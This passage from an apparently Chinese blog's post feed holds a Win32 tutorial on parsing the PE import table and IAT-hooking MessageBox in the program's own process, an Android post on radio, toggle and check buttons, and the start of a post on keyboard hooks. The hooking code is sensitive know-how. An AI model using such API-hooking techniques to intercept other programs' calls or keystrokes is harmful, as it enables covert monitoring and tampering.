</ol>
<h3 id="相应地址的推导"><a href="#相应地址的推导" class="headerlink" title="相应地址的推导"></a>相应地址的推导</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">HMODULE hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)hMod;</span><br><span class="line">IMAGE_OPTIONAL_HEADER * pOptHeader = (IMAGE_OPTIONAL_HEADER *)((BYTE *)hMod + pDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">IMAGE_IMPORT_DESCRIPTOR * pImportDesc= (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)hMod + </span><br><span class="line">	pOptHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br></pre></td></tr></table></figure>
<p>这个东西其实就是这个样子搞出来的，24是由于：NT签名（PE00）占四个字节，后面20个是IMAGE_FILE_HEADER这个结构体，之前说过的。</p>
<h2 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hMod = GetModuleHandle(<span class="literal">NULL</span>);</span><br><span class="line">	IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)hMod;</span><br><span class="line">	IMAGE_OPTIONAL_HEADER * pOptHeader = (IMAGE_OPTIONAL_HEADER *)((BYTE *)hMod + pDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">	IMAGE_IMPORT_DESCRIPTOR * pImportDesc= (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)hMod + </span><br><span class="line">		pOptHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"程序入口:%x"</span>,hMod);</span><br><span class="line">	<span class="keyword">while</span> (pImportDesc-&gt;FirstThunk)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> * pszDllName = (<span class="keyword">char</span> * )((BYTE * )hMod + pImportDesc-&gt;Name);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\n 模块名称: %s \n"</span>,pszDllName);</span><br><span class="line">		IMAGE_THUNK_DATA * pThunk = (IMAGE_THUNK_DATA * )((BYTE*)hMod + pImportDesc-&gt;OriginalFirstThunk);</span><br><span class="line">		<span class="keyword">int</span> n = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">while</span>(pThunk-&gt;u1.Function)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">char</span> * pszFunName = (<span class="keyword">char</span> *)((BYTE*)hMod + (DWORD)pThunk-&gt;u1.AddressOfData+<span class="number">2</span>);<span class="comment">//前两个是函数的序号</span></span><br><span class="line">			PDWORD lpAddr = (DWORD * )((BYTE*)hMod + pImportDesc-&gt;FirstThunk)+n;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"	导出函数:%-25s"</span>,pszFunName);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">"函数地址:%X\n"</span>,lpAddr);</span><br><span class="line">			n++;pThunk++;</span><br><span class="line">		&#125;</span><br><span class="line">		pImportDesc++;</span><br><span class="line">	&#125;</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实这个IAT就是一个DWORD类型的数组，这里需要注意的是，++这个操作符适用于增加一个结构大小的在这里，然后这个+n也是增加结构体大小，基础有说过。</p>
<p>程序运行结构：<br><img src="img1.jpg" alt="运行结果"></p>
<h2 id="分析结构"><a href="#分析结构" class="headerlink" title="分析结构"></a>分析结构</h2><p>我们用OD载入，注意的是可能OD有提示代码的一个问题，不用管就好。<br>首先我们打印那个GetModuleHandle返回的结构对应的值，我们也能够dd查看对应的ASCII码，会看到如下：<br><img src="img2.jpg" alt="起始地址"><br>起始可以发现，就是文件的一个签名开头罢了。</p>
<p>然后我们来验证函数的一个正确性，还是用dd进行查看：<br><img src="img3.jpg" alt="导出表"></p>
<p>我们代码的编写是没有什么问题的，这个时候我们既然有了这个地址，就好办了，我们就可以偷梁换柱，将我们自己的函数给替换上去。</p>
<h2 id="HOOK函数"><a href="#HOOK函数" class="headerlink" title="HOOK函数"></a>HOOK函数</h2><p>这个东西很有用，但是针对于自身程序的话呢还是有一定限制，并且最后我还是没有研究出原因，之后慢慢分析。<br>我们对<code>MessageBox</code>进行Hook替换，其实原理也不是很高深，就是对我们的导入表函数地址进行改写，但在这里我踩了不少坑。<br>首先我们先来编写这个获取某个函数的地址的函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">SetHook</span><span class="params">(LPCTSTR ModuleName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hMod = GetModuleHandle(ModuleName);</span><br><span class="line">	IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)hMod;</span><br><span class="line">	IMAGE_OPTIONAL_HEADER * pOptHeader = (IMAGE_OPTIONAL_HEADER *)((BYTE *)hMod + pDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">	IMAGE_IMPORT_DESCRIPTOR * pImportDesc= (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)hMod + </span><br><span class="line">		pOptHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	<span class="keyword">while</span> (pImportDesc-&gt;FirstThunk)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> * pszDllName = (<span class="keyword">char</span> * )((BYTE * )hMod + pImportDesc-&gt;Name);</span><br><span class="line">		<span class="keyword">if</span> (lstrcmp(pszDllName,<span class="string">"USER32.dll"</span>) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pImportDesc++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pImportDesc-&gt;FirstThunk)</span><br><span class="line">	&#123;</span><br><span class="line">		IMAGE_THUNK_DATA * pThunk = (IMAGE_THUNK_DATA * )((BYTE*)hMod + pImportDesc-&gt;FirstThunk);</span><br><span class="line">		<span class="keyword">while</span>(pThunk-&gt;u1.Function)</span><br><span class="line">		&#123;</span><br><span class="line">			PDWORD lpAddr = (DWORD *)&amp;(pThunk-&gt;u1.Function);</span><br><span class="line">			<span class="keyword">if</span> (*lpAddr == (DWORD)g_orgProc)</span><br><span class="line">			&#123;</span><br><span class="line">				PDWORD lpNewFun = (PDWORD)MyMessageBox;</span><br><span class="line">				DWORD dwWrite;</span><br><span class="line">				<span class="comment">/*修改页面保护属性*/</span></span><br><span class="line">				DWORD dwOldProect;</span><br><span class="line">				VirtualProtect(lpAddr,<span class="keyword">sizeof</span>(DWORD),PAGE_READWRITE,&amp;dwOldProect);</span><br><span class="line">				WriteProcessMemory(GetCurrentProcess(),lpAddr,&amp;lpNewFun,<span class="keyword">sizeof</span>(DWORD),&amp;dwWrite);</span><br><span class="line">				VirtualProtect(lpAddr,<span class="keyword">sizeof</span>(DWORD),dwOldProect,<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">if</span> (dwWrite == <span class="keyword">sizeof</span>(DWORD))</span><br><span class="line">					<span class="keyword">return</span> TRUE;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			pThunk++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参数是我们要修改的模块名称，我们填写NULL的话呢我们就是修改我们自身，和上面的代码一样，我们显示寻找IAT，当找到USER.dll的时候我们跳出，这个时候要注意了，这个是大写，不是小写，xp是小写，我们这个是大写。跳出之后我们在继续寻找函数，寻找函数我们不能用名字，我们这里用函数的地址，所以我们需要先声明MessageBox的地址是多少：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">PROC g_orgProc = (PROC)MessageBox;<span class="comment">//原始的信息框地址</span></span><br></pre></td></tr></table></figure>
<p>这个样子我们就获取到了MessageBox的函数地址。进行比较，找到之后我们将这个内存地址的值修改为我们的函数的内存地址，这里需要注意的是，使用WriteProcess函数的时候我们在Release版本下面的时候我们需要进行内存权限的修改，就在这里除了问题有可能，找到之后替换我们的函数，由于要求堆栈的平衡，所以函数我们要完全按格式来写:<br>首先先定义函数：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PUNMESSAGEBOX)</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span>;</span><br></pre></td></tr></table></figure>
<p>这句话你就是将<code>PUNMESSAGEBOX</code>这个东西定义成了一个MessageBox。<br>然后下面写我们的MessageBox：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBox</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ((PUNMESSAGEBOX)g_orgProc)(hWnd,<span class="string">"New Fun"</span>,<span class="string">"HOOK"</span>,uType);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其实就是将原来的函数执行，要执行g_orgProc，我们要进行强制转换，转换称上面宏定义的内容，我们改为我们的函数。<br>这个样子我们的程序就算编写完毕：<br>完整代码：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetHook</span><span class="params">(LPCTSTR ModuleName)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">int</span> <span class="params">(WINAPI *PUNMESSAGEBOX)</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span>;</span><br><span class="line">PROC g_orgProc = (PROC)MessageBox;<span class="comment">//原始的信息框地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,<span class="string">"Org Fun"</span>,<span class="string">"Test"</span>,MB_OK);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//if(!SetHook(NULL))</span></span><br><span class="line">	<span class="comment">//	return -1;</span></span><br><span class="line">	SetHook(<span class="literal">NULL</span>);</span><br><span class="line">	MessageBox(<span class="literal">NULL</span>,<span class="string">"Org Fun"</span>,<span class="string">"Test"</span>,MB_OK);</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">MyMessageBox</span><span class="params">(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> ((PUNMESSAGEBOX)g_orgProc)(hWnd,<span class="string">"New Fun"</span>,<span class="string">"HOOK"</span>,uType);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">SetHook</span><span class="params">(LPCTSTR ModuleName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HMODULE hMod = GetModuleHandle(ModuleName);</span><br><span class="line">	IMAGE_DOS_HEADER * pDosHeader = (IMAGE_DOS_HEADER *)hMod;</span><br><span class="line">	IMAGE_OPTIONAL_HEADER * pOptHeader = (IMAGE_OPTIONAL_HEADER *)((BYTE *)hMod + pDosHeader-&gt;e_lfanew + <span class="number">24</span>);</span><br><span class="line">	IMAGE_IMPORT_DESCRIPTOR * pImportDesc= (IMAGE_IMPORT_DESCRIPTOR *)((BYTE *)hMod + </span><br><span class="line">		pOptHeader-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress);</span><br><span class="line">	<span class="keyword">while</span> (pImportDesc-&gt;FirstThunk)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">char</span> * pszDllName = (<span class="keyword">char</span> * )((BYTE * )hMod + pImportDesc-&gt;Name);</span><br><span class="line">		<span class="keyword">if</span> (lstrcmp(pszDllName,<span class="string">"USER32.dll"</span>) == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		pImportDesc++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (pImportDesc-&gt;FirstThunk)</span><br><span class="line">	&#123;</span><br><span class="line">		IMAGE_THUNK_DATA * pThunk = (IMAGE_THUNK_DATA * )((BYTE*)hMod + pImportDesc-&gt;FirstThunk);</span><br><span class="line">		<span class="keyword">while</span>(pThunk-&gt;u1.Function)</span><br><span class="line">		&#123;</span><br><span class="line">			PDWORD lpAddr = (DWORD *)&amp;(pThunk-&gt;u1.Function);</span><br><span class="line">			<span class="keyword">if</span> (*lpAddr == (DWORD)g_orgProc)</span><br><span class="line">			&#123;</span><br><span class="line">				PDWORD lpNewFun = (PDWORD)MyMessageBox;</span><br><span class="line">				DWORD dwWrite;</span><br><span class="line">				<span class="comment">/*修改页面保护属性*/</span></span><br><span class="line">				DWORD dwOldProect;</span><br><span class="line">				VirtualProtect(lpAddr,<span class="keyword">sizeof</span>(DWORD),PAGE_READWRITE,&amp;dwOldProect);</span><br><span class="line">				WriteProcessMemory(GetCurrentProcess(),lpAddr,&amp;lpNewFun,<span class="keyword">sizeof</span>(DWORD),&amp;dwWrite);</span><br><span class="line">				VirtualProtect(lpAddr,<span class="keyword">sizeof</span>(DWORD),dwOldProect,<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">if</span> (dwWrite == <span class="keyword">sizeof</span>(DWORD))</span><br><span class="line">					<span class="keyword">return</span> TRUE;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					<span class="keyword">return</span> FALSE;</span><br><span class="line">				</span><br><span class="line">			&#125;</span><br><span class="line">			pThunk++;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> FALSE;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在这里还需要再说几句，<code>PDWORD lpAddr = (DWORD *)&amp;(pThunk-&gt;u1.Function);</code>这句话就是获取我们保存MessageBox地址的地址，也就是说这个是个间接寻址，所以我们要用到取地址，然再用这个地址的值去做比较，那为什么不直接用值呢。因为我们WriteProcessMemory写入的时候是需要用到这个地址的。<br>其实这个东西是有点乱，我现在看着也有点乱，而且你要想记住是有一些难度的，这个东西就是要用的时候去查就可以了。</p>
<p>看下运行结果：<br><img src="img4.jpg" alt="运行结果"></p>
<h3 id="错误"><a href="#错误" class="headerlink" title="错误"></a>错误</h3><p>这个地方在我们Release版本下面我实在在代码层找不到原因为什么替换之后还是执行之前的，我用OD分析了一下，虽然不愿因深入去看，但是我却知道了原因，看下面OD的内容：<br><img src="img5.jpg" alt="奇怪的地方"><br>首先我们看到，我们的MessageBox函数地址换了，系统领空到了我们程序的领空，但是，大家注意，程序突然就call了ESI，ESI又是之前MessageBox，这个就让我很奇怪，我严重怀疑是编译器的问题！！！</p>
]]></content>
      <categories>
        <category>Win32编程</category>
      </categories>
      <tags>
        <tag>Win32编程</tag>
      </tags>
  </entry>
  <entry>
    <title>Android常用按钮</title>
    <url>/2020/02/05/Android%E5%B8%B8%E7%94%A8%E6%8C%89%E9%92%AE/</url>
    <content><![CDATA[<h1 id="常用按钮"><a href="#常用按钮" class="headerlink" title="常用按钮"></a>常用按钮</h1><p>这里常用的按钮就是我们常用的单选框，复选框之类的一些按钮。<br>都是一些普通Button的子类。</p>
<h2 id="RadioButton"><a href="#RadioButton" class="headerlink" title="RadioButton"></a>RadioButton</h2><p>单选按钮，和一Win32的不大一样，因为java中有布局的概念，所以在一个特殊的布局中的单选按钮是一个组。这个特殊的布局就是：<code>RadioGroup</code>。</p>
<p>看一下XML的定义：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">RadioGroup</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/radioGroup1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">RadioButton</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/radioButton1"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"男"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">RadioButton</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/RadioButton01"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"女"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">RadioGroup</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>就是在RadioGroup布局中的就是一个组，这里我们一般将这个布局获取到，然后判断child的选中。<br>实例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> n = rg_gender.getChildCount();<span class="comment">//获取控件数量</span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span> ; i &lt; n ; i++)</span><br><span class="line">&#123;</span><br><span class="line">	RadioButton rad = (RadioButton) rg_gender.getChildAt(i);</span><br><span class="line">	<span class="keyword">if</span>(rad.isChecked())</span><br><span class="line">	&#123;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, rad.getText(), Toast.LENGTH_SHORT).show();</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意，这段代码是在按钮事件里面的，所以我们上下文的时候我们不能只简单的写this，而要写上我们的布局。</p>
<h2 id="ToggleButton"><a href="#ToggleButton" class="headerlink" title="ToggleButton"></a>ToggleButton</h2><p>开关按钮，其实之前我是不知道的，因为Windows下面是没有这个东西的，简单的说其实就是一个简单的开关（我其实我感觉这个东西基本不怎么用吧，用个复选框就可以替代了）。<br>用这个开关按钮实现一个布局的设计。<br>XML代码：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ToggleButton</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/toggleButton1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignRight</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"28dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:checked</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"ToggleButton"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textOff</span>=<span class="string">"纵向排列"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textOn</span>=<span class="string">"横向排列"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/LLayout"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_below</span>=<span class="string">"@+id/toggleButton1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"14dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"ceshi1"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"ceshi2"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们目的是要改变这个LinearLayout的排列方式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">togbtn = (ToggleButton) findViewById(R.id.toggleButton1);</span><br><span class="line">llayout = (LinearLayout) findViewById(R.id.LLayout);</span><br><span class="line">togbtn.setOnCheckedChangeListener(<span class="keyword">new</span> OnCheckedChangeListener() &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCheckedChanged</span><span class="params">(CompoundButton buttonView, <span class="keyword">boolean</span> isChecked)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(isChecked)<span class="comment">//On</span></span><br><span class="line">		&#123;</span><br><span class="line">			llayout.setOrientation(LinearLayout.VERTICAL);</span><br><span class="line">		&#125;<span class="keyword">else</span><span class="comment">//Off</span></span><br><span class="line">		&#123;</span><br><span class="line">			llayout.setOrientation(LinearLayout.HORIZONTAL);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CheckBox"><a href="#CheckBox" class="headerlink" title="CheckBox"></a>CheckBox</h2><p>复选框，这个就和Windows下面的是一个样子的。这里我们用到List集合。首先我们先定义这么一个布局：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/linearLayout1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignTop</span>=<span class="string">"@+id/radioGroup1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginLeft</span>=<span class="string">"74dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_toRightOf</span>=<span class="string">"@+id/button1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:orientation</span>=<span class="string">"vertical"</span> &gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button2"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignLeft</span>=<span class="string">"@+id/linearLayout1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_alignTop</span>=<span class="string">"@+id/toggleButton1"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_marginTop</span>=<span class="string">"22dp"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"check"</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p>LinearLayout里面什么也没有，我们要动态的进行添加。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> List&lt;CheckBox&gt; checkBoxList = <span class="keyword">new</span> ArrayList&lt;CheckBox&gt;();<span class="comment">//checkbox的集合</span></span><br></pre></td></tr></table></figure>
<p>一个集合，里面主要是用来存放我们的checkbox的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">llayout2 = (LinearLayout) findViewById(R.id.linearLayout1);</span><br><span class="line">btn2 = (Button) findViewById(R.id.button2);</span><br><span class="line"></span><br><span class="line">String[] strArray = &#123;<span class="string">"1"</span>,<span class="string">"2"</span>,<span class="string">"3"</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>;i &lt; <span class="number">3</span> ; i++)</span><br><span class="line">&#123;</span><br><span class="line">	CheckBox ck = (CheckBox) View.inflate(<span class="keyword">this</span>, R.layout.ui_checked, <span class="keyword">null</span>);</span><br><span class="line">	ck.setText(strArray[i]);</span><br><span class="line">	llayout2.addView(ck);</span><br><span class="line">	checkBoxList.add(ck);</span><br><span class="line">&#125;</span><br><span class="line">btn2.setOnClickListener(<span class="keyword">new</span> OnClickListener() &#123;</span><br><span class="line">		</span><br><span class="line">	<span class="comment">//String str = "";如果在这里定义将会不清空的</span></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">		String str = <span class="string">""</span>;</span><br><span class="line">		<span class="keyword">for</span> (CheckBox checkbox : checkBoxList) &#123;</span><br><span class="line">			<span class="keyword">if</span>(checkbox.isChecked())</span><br><span class="line">			&#123;</span><br><span class="line">				str += checkbox.getText().toString();</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		Toast.makeText(MainActivity.<span class="keyword">this</span>, str, Toast.LENGTH_SHORT).show();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>首先我们先获得布局，然后定义了一个数组，存放我们的内容，然后通过按钮点击事件进行一个一个检验，不要忘记加到布局之后还要加到集合，还有我发现我们将我们的变量放在监听器new的一个类的时候，这个对象就和我们之前普通的一个类一样，比如这个String如果不是在这个onClick的里面的话呢，每次是不会清空的。<br><img src="img1.jpg" alt="效果图"></p>
]]></content>
      <categories>
        <category>Android学习</category>
      </categories>
      <tags>
        <tag>Android学习</tag>
      </tags>
  </entry>
  <entry>
    <title>键盘钩子</title>
    <url>/2020/02/05/%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/</url>
    <content><![CDATA[<h1 id="钩子"><a href="#钩子" class="headerlink" title="钩子"></a>钩子</h1><p>百度百科的解释：</p>
<hr>
<p>钩子(Hook)，是Windows消息处理机制的一个平台，应用程序可以在上面设置子程以监视指定窗口的某种消息，而且所监视的窗口可以是其他进程所创建的。当消息到达后，在目标窗口处理函数之前处理它。钩子机制允许应用程序截获处理window消息或特定事件。<br>钩子实际上是一个处理消息的程序段，通过系统调用，把它挂入系统。每当特定的消息发出，在没有到达目的窗口前，钩子程序就先捕获该消息，亦即钩子函数先得到控制权。这时钩子函数即可以加工处理（改变）该消息，也可以不作处理而继续传递该消息，还可以强制结束消息的传递。</p>
<hr>
<p>其实也是比较好理解的，就是Windows在处理一些东西的时候，例如发送数据包，删除文件夹，打字，点击鼠标之类的一些事件的时候都会根据钩子链这种东西一级一级的往下执行，比如我们的程序就有一个钩子在链中（我记得是后加入的钩子在钩子链的顶端），我们可以截获这个操作，然后对这个操作做一些手脚。</p>
